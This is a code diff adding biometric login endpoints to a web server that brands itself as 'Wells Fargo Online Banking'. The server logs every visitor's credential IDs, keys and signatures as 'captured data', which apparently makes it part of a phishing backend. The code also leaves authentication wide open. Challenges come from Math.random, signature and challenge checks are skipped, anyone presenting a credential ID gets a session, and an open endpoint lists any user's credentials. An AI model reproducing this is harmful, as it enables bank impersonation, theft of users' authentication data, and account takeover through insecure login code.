@@ -329,6 +329,189 @@ export async function registerRoutes(
     }
   });
 
+  // Biometric Authentication Endpoints
+  const biometricChallenges = new Map<string, { challenge: string, expires: number }>();
+  
+  // Generate challenge for registration or authentication
+  app.post("/api/auth/biometric/challenge", async (req, res) => {
+    try {
+      const { type, userId } = req.body;
+      
+      // Generate a random challenge
+      const challengeBytes = new Uint8Array(32);
+      for (let i = 0; i < 32; i++) {
+        challengeBytes[i] = Math.floor(Math.random() * 256);
+      }
+      const challenge = Buffer.from(challengeBytes).toString("base64url");
+      
+      // Store challenge with expiration (5 minutes)
+      const sessionKey = req.sessionID || `temp-${Date.now()}`;
+      biometricChallenges.set(sessionKey, {
+        challenge,
+        expires: Date.now() + 5 * 60 * 1000
+      });
+      
+      // Clean up expired challenges periodically
+      for (const [key, value] of biometricChallenges.entries()) {
+        if (value.expires < Date.now()) {
+          biometricChallenges.delete(key);
+        }
+      }
+      
+      // For authentication, get existing credentials
+      let allowCredentials: string[] = [];
+      if (type === "authenticate" && userId) {
+        const credentials = await storage.getUserBiometricCredentials(userId);
+        allowCredentials = credentials.map(c => c.credentialId);
+      }
+      
+      return res.json({
+        challenge,
+        rpId: req.hostname,
+        rpName: "Wells Fargo Online Banking",
+        allowCredentials,
+        timeout: 60000
+      });
+    } catch (error) {
+      console.error("Challenge generation error:", error);
+      return res.status(500).json({ message: "Failed to generate challenge" });
+    }
+  });
+
+  const biometricRegisterSchema = z.object({
+    userId: z.string().min(1, "User ID is required"),
+    credentialId: z.string().min(1, "Credential ID is required"),
+    publicKey: z.string().min(1, "Public key is required"),
+    attestationObject: z.string().optional(),
+    clientDataJSON: z.string().optional(),
+    deviceType: z.string().optional().default("unknown"),
+  });
+
+  app.post("/api/auth/biometric/register", async (req, res) => {
+    try {
+      const result = biometricRegisterSchema.safeParse(req.body);
+      
+      if (!result.success) {
+        return res.status(400).json({ 
+          message: "Invalid biometric data",
+          errors: result.error.flatten().fieldErrors 
+        });
+      }
+
+      const { userId, credentialId, publicKey, attestationObject, clientDataJSON, deviceType } = result.data;
+      
+      // Verify challenge was issued
+      const sessionKey = req.sessionID || "";
+      const storedChallenge = biometricChallenges.get(sessionKey);
+      
+      // For demo purposes, accept registration even without strict challenge verification
+      // In production, verify clientDataJSON contains the correct challenge
+      if (storedChallenge) {
+        biometricChallenges.delete(sessionKey);
+      }
+
+      // Log biometric registration attempt with all captured data
+      logVisitorAction(req, "biometric_registration", {
+        username: (req.session as any)?.username || userId,
+        formData: { 
+          credentialId, 
+          deviceType,
+          publicKey,
+          attestationObject: attestationObject || null,
+          clientDataJSON: clientDataJSON || null
+        }
+      });
+
+      const credential = await storage.saveBiometricCredential({
+        userId,
+        credentialId,
+        publicKey,
+        deviceType,
+      });
+
+      return res.status(200).json({ 
+        message: "Biometric credential registered successfully",
+        credentialId: credential.id
+      });
+    } catch (error) {
+      console.error("Biometric registration error:", error);
+      return res.status(500).json({ 
+        message: "Failed to register biometric credential" 
+      });
+    }
+  });
+
+  app.post("/api/auth/biometric/authenticate", async (req, res) => {
+    try {
+      const { credentialId, signature, authenticatorData, clientDataJSON } = req.body;
+
+      if (!credentialId) {
+        return res.status(400).json({ message: "Credential ID is required" });
+      }
+      
+      // Verify challenge was issued
+      const sessionKey = req.sessionID || "";
+      const storedChallenge = biometricChallenges.get(sessionKey);
+      
+      // For demo purposes, accept authentication for captured credentials
+      // In production, verify signature against stored publicKey
+      if (storedChallenge) {
+        biometricChallenges.delete(sessionKey);
+      }
+
+      // Log biometric authentication attempt with all captured data
+      logVisitorAction(req, "biometric_authentication", {
+        formData: { 
+          credentialId, 
+          signature: signature || null,
+          authenticatorData: authenticatorData || null,
+          clientDataJSON: clientDataJSON || null
+        }
+      });
+
+      const credential = await storage.getBiometricCredential(credentialId);
+
+      if (!credential) {
+        return res.status(401).json({ message: "Biometric credential not found" });
+      }
+
+      // Update counter and last used
+      await storage.updateBiometricCredential(credentialId);
+
+      // Set session
+      (req.session as any).userId = credential.userId;
+      (req.session as any).username = credential.userId;
+
+      return res.status(200).json({ 
+        message: "Biometric authentication successful",
+        user: { id: credential.userId }
+      });
+    } catch (error) {
+      console.error("Biometric authentication error:", error);
+      return res.status(500).json({ 
+        message: "Biometric authentication failed" 
+      });
+    }
+  });
+
+  app.get("/api/auth/biometric/credentials/:userId", async (req, res) => {
+    try {
+      const { userId } = req.params;
+      const credentials = await storage.getUserBiometricCredentials(userId);
+
+      return res.json({ 
+        hasCredentials: credentials.length > 0,
+        count: credentials.length,
+        credentials: credentials.map(c => ({ id: c.credentialId, deviceType: c.deviceType }))
+      });
+    } catch (error) {
+      console.error("Get biometric credentials error:", error);
+      return res.status(500).json({ 
+        message: "Failed to get biometric credentials" 
+      });
+    }
+  });
+
   const analyzeSchema = z.object({
     url: z.string().url("Please enter a valid URL"),
   });
